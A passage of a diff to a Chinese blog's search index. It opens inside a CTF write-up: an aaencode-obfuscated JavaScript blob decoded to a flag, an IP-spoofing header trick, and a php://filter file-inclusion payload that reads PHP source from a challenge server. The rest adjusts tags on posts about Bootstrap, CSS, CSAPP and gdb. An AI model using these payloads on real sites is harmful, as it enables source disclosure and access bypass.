(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (o^_^o)+ (ﾟДﾟ) [&apos;c&apos;]+ (ﾟДﾟ) [&apos;c&apos;]+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (o^_^o)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟｰﾟ)+ (ﾟДﾟ) .ﾟДﾟﾉ+ (c^_^o)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+ (ﾟДﾟ) .ﾟΘﾟﾉ+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟｰﾟ)+ (ﾟДﾟ) .ﾟДﾟﾉ+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&apos;_&apos;);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ﾟωﾟﾉ&#x3D; &#x2F;｀ｍ´）ﾉ ~┻━┻   &#x2F;&#x2F;*´∇｀*&#x2F; [&#39;_&#39;]; o&#x3D;(ﾟｰﾟ)  &#x3D;_&#x3D;3; c&#x3D;(ﾟΘﾟ) &#x3D;(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) &#x3D;(ﾟΘﾟ)&#x3D; (o^_^o)&#x2F; (o^_^o);(ﾟДﾟ)&#x3D;&#123;ﾟΘﾟ: &#39;_&#39; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#39;_&#39;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] &#x3D;((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [c^_^o];(ﾟДﾟ) [&#39;c&#39;] &#x3D; ((ﾟДﾟ)+&#39;_&#39;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#39;o&#39;] &#x3D; ((ﾟДﾟ)+&#39;_&#39;) [ﾟΘﾟ];(ﾟoﾟ)&#x3D;(ﾟДﾟ) [&#39;c&#39;]+(ﾟДﾟ) [&#39;o&#39;]+(ﾟωﾟﾉ +&#39;_&#39;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#39;c&#39;]+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#39;o&#39;]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ];(ﾟДﾟ) [&#39;_&#39;] &#x3D;(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)&#x3D;((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#39;_&#39;) [ﾟΘﾟ]; (ﾟｰﾟ)+&#x3D;(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]&#x3D;&#39;\\&#39;; (ﾟДﾟ).ﾟΘﾟﾉ&#x3D;(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)&#x3D;(ﾟωﾟﾉ +&#39;_&#39;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]&#x3D;&#39;\&quot;&#39;;(ﾟДﾟ) [&#39;_&#39;] ( (ﾟДﾟ) [&#39;_&#39;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (o^_^o)+ (ﾟДﾟ) [&#39;c&#39;]+ (ﾟДﾟ) [&#39;c&#39;]+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (o^_^o)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟｰﾟ)+ (ﾟДﾟ) .ﾟДﾟﾉ+ (c^_^o)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+ (ﾟДﾟ) .ﾟΘﾟﾉ+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟｰﾟ)+ (ﾟДﾟ) .ﾟДﾟﾉ+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#39;_&#39;);</span><br></pre></td></tr></table></figure>
 <p>由于其规律性，猜测这可能是一种编码。费尽周折后终于找到了这门奇怪的编码<code>aaencode</code>，并找到<a href="https://tool.zcmzcm.org/aadecode" target="_blank" rel="noopener">在线解码网址</a>。解码后得到flag。</p>
 <h3 id="二、web"><a href="#二、web" class="headerlink" title="二、web"></a>二、web</h3><h4 id="1-where-are-you-from-level1"><a href="#1-where-are-you-from-level1" class="headerlink" title="1.where are you from level1"></a>1.where are you from level1</h4><p>进入题目中网址，它提示要“only guest from 127.0.0.1 can get flag of level1”。所以，猜测要伪造本机的IP地址，于是用fiddler拦截提交的网络包，在Http头中加入<code>Client-Ip: 127.0.0.1</code>，再发出。然后，网页就返回了flag。</p>
 <h4 id="2-include-me"><a href="#2-include-me" class="headerlink" title="2.include me"></a>2.include me</h4><p>进入题目中网址，点击一下网页中的按钮后，通过网页的url<code>http://49.4.68.67:88/?lang=cn.php</code>可以看出这是一个文件包含漏洞题。于是，将url改成<code>http://49.4.68.67:88/index.php?lang=php://filter/read=convert.base64-encode/resource=index.php</code>即得到了base64加密的PHP源码。经过解码后，flag即在程序注释里。</p>
@@ -610,15 +616,16 @@
 <p>运行脚本，连接到服务器后再输入0，即拿到了flag。</p>
 ]]></content>
       <categories>
-        <category>计算机基础</category>
+        <category>不知道怎么分类的分类</category>
       </categories>
       <tags>
         <tag>信息安全</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
     <title>bootstrap4框架使用总结</title>
-    <url>/application/bootstrap4%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93.html</url>
+    <url>/bootstrap4%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93.html</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>bootstrap 是一个开源的前端框架，主要应用于页面的布局。</p>
 <p>官网介绍：</p>
 <blockquote>
@@ -707,15 +714,17 @@
 <p><img src="bootstrap4框架使用总结/blockquote.png" alt="块引用"></p>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>不想开滴滴的外卖骑手不是好码农</category>
+        <category>前端</category>
       </categories>
       <tags>
-        <tag>Frontend</tag>
+        <tag>前端</tag>
+        <tag>Bootstrap</tag>
       </tags>
   </entry>
   <entry>
     <title>css实践总结</title>
-    <url>/application/css%E5%AE%9E%E8%B7%B5%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98.html</url>
+    <url>/css%E5%AE%9E%E8%B7%B5%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98.html</url>
     <content><![CDATA[<h3 id="1-块元素-如div-独占一行"><a href="#1-块元素-如div-独占一行" class="headerlink" title="1. 块元素(如div)独占一行"></a>1. 块元素(如div)独占一行</h3><h4 id="1-1-问题"><a href="#1-1-问题" class="headerlink" title="1.1. 问题"></a>1.1. 问题</h4><p>当笔者最初接触div盒模型来给界面进行布局时，遇到过这样一个问题：</p>
 <a id="more"></a>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>test_div<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css"><span class="selector-id">#father</span> &#123;</span></span><br><span class="line">    background-color: blue;</span><br><span class="line">    height: 400px;</span><br><span class="line">    border: 2px solid black;</span><br><span class="line">&#125;</span><br><span class="line"><span class="css"><span class="selector-id">#son1</span> &#123;</span></span><br><span class="line">    background-color: yellow;</span><br><span class="line">    width: 300px;</span><br><span class="line">    height: 200px;</span><br><span class="line">    border: 25px solid green;</span><br><span class="line">    padding: 25px;</span><br><span class="line">    margin: 25px;</span><br><span class="line">&#125;</span><br><span class="line"><span class="css"><span class="selector-id">#son2</span> &#123;</span></span><br><span class="line">    background-color: red;</span><br><span class="line">    width: 300px;</span><br><span class="line">    height: 200px;</span><br><span class="line">    border: 25px solid black;</span><br><span class="line">    padding: 25px;</span><br><span class="line">    margin: 25px;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"father"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"son1"</span>&gt;</span>这里是盒子test1内的实际内容。盒子:300px 宽，200px 高，25px 内间距，25px 外间距，25px 绿色边框。<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"son2"</span>&gt;</span>这里是盒子test2内的实际内容。盒子:300px 宽，200px 高，25px 内间距，25px 外间距，25px 黑色边框。<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
@@ -765,15 +774,17 @@
 <p>同理，<code>@media (max-width: 900px)</code> 使css样式只适用于小于<code>900px</code>的设备。</p>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>不想开滴滴的外卖骑手不是好码农</category>
+        <category>前端</category>
       </categories>
       <tags>
-        <tag>Frontend</tag>
+        <tag>前端</tag>
+        <tag>CSS</tag>
       </tags>
   </entry>
   <entry>
     <title>CSAPP第2章-数据表示</title>
-    <url>/cs/csapp2-%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%A4%BA.html</url>
+    <url>/csapp2-%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%A4%BA.html</url>
     <content><![CDATA[<p>[TOC]</p>
 <h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>只记载重难点内容。</p>
 <a id="more"></a>
@@ -863,7 +874,8 @@
 <p><img src="csapp2-数据表示/10.png" alt="img"></p>
 ]]></content>
       <categories>
-        <category>计算机基础</category>
+        <category>九层之台，起于累土</category>
+        <category>计算机系统</category>
       </categories>
       <tags>
         <tag>计算机系统</tag>
@@ -871,7 +883,7 @@
   </entry>
   <entry>
     <title>gdb基础学习笔记</title>
-    <url>/application/gdb%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
+    <url>/gdb%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
     <content><![CDATA[<h3 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h3><p>自古调试分两派，<code>printf</code>直接输出派 和 <code>gdb</code>调试派。</p>
 <p><code>printf</code>派直观暴力，但不全面。</p>
 <p><code>gdb</code>派全面却麻烦。</p>
@@ -898,10 +910,10 @@
 </ul>
 <p>简写：<code>l</code></p>
 <p>示例：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) l</span><br><span class="line">warning: Source file is more recent than executable.</span><br><span class="line">1       #include&lt;stdio.h&gt;</span><br><span class="line">2</span><br><span class="line">3       int fun(int a, int b) &#123;</span><br><span class="line">4                       int val = 0;</span><br><span class="line">5                       if (a &gt; b) &#123;</span><br><span class="line">6                                       val = a + b;</span><br><span class="line">7                       &#125; else &#123;</span><br><span class="line">8                                       val = a - b;</span><br><span class="line">9                       &#125;</span><br><span class="line">10                      return val;</span><br><span class="line">(gdb) l</span><br><span class="line">11      &#125;</span><br><span class="line">12</span><br><span class="line">13      int main() &#123;</span><br><span class="line">14                      printf(&quot;hello gdb!\n&quot;);</span><br><span 